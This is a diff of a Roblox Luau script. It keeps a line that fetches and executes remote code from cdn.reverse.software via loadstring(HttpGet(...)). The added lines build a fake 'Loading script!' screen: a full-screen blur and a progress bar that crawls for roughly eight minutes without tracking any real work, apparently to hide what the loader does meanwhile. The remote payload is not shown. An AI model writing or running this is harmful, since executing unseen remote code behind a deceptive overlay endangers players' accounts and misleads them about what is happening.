@@ -1,2 +1,93 @@
 ID="10026242-d14a-4e13-9e3e-8e65a39928fd";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+
+local TweenService = game:GetService("TweenService")
+local gui = Instance.new("ScreenGui")
+local mainFrame = Instance.new("Frame")
+local uicorner = Instance.new("UICorner")
+local title = Instance.new("TextLabel")
+local infoLabel = Instance.new("TextLabel")
+local progressBarBG = Instance.new("Frame")
+local progressBar = Instance.new("Frame")
+local percentLabel = Instance.new("TextLabel")
+local corner1 = Instance.new("UICorner")
+local corner2 = Instance.new("UICorner")
+
+pcall(function()
+	gui.Parent = game:GetService("CoreGui")
+end)
+if not gui.Parent then
+	gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+end
+
+gui.Name = "LoadingScriptGUI"
+gui.ResetOnSpawn = false
+gui.Enabled = true
+
+mainFrame.Parent = gui
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+mainFrame.Size = UDim2.new(0, 400, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -90)
+mainFrame.BackgroundTransparency = 1
+uicorner.CornerRadius = UDim.new(0, 16)
+uicorner.Parent = mainFrame
+
+title.Parent = mainFrame
+title.Text = "Loading script!"
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(0, 255, 170)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+
+infoLabel.Parent = mainFrame
+infoLabel.Text = "Script Loading... Please wait until 100%"
+infoLabel.Size = UDim2.new(1, 0, 0, 20)
+infoLabel.Position = UDim2.new(0, 0, 0, 55)
+infoLabel.BackgroundTransparency = 1
+infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+infoLabel.Font = Enum.Font.Gotham
+infoLabel.TextScaled = true
+
+progressBarBG.Parent = mainFrame
+progressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+progressBarBG.Position = UDim2.new(0.1, 0, 0.65, 0)
+progressBarBG.Size = UDim2.new(0.8, 0, 0.12, 0)
+corner1.CornerRadius = UDim.new(0, 16)
+corner1.Parent = progressBarBG
+
+progressBar.Parent = progressBarBG
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+corner2.CornerRadius = UDim.new(0, 16)
+corner2.Parent = progressBar
+
+percentLabel.Parent = mainFrame
+percentLabel.Text = "0%"
+percentLabel.Size = UDim2.new(1, 0, 0, 30)
+percentLabel.Position = UDim2.new(0, 0, 0.8, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.TextScaled = true
+
+local blur = Instance.new("BlurEffect")
+blur.Size = 999
+blur.Parent = game:GetService("Lighting")
+
+TweenService:Create(mainFrame, TweenInfo.new(1), {BackgroundTransparency = 0.1}):Play()
+
+spawn(function()
+	for i = 0, 100 do
+		local goalSize = UDim2.new(i / 100, 0, 1, 0)
+		TweenService:Create(progressBar, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			Size = goalSize
+		}):Play()
+		percentLabel.Text = i .. "%"
+		wait(4.8)
+	end
+
+	gui:Destroy()
+	blur:Destroy()
+end)
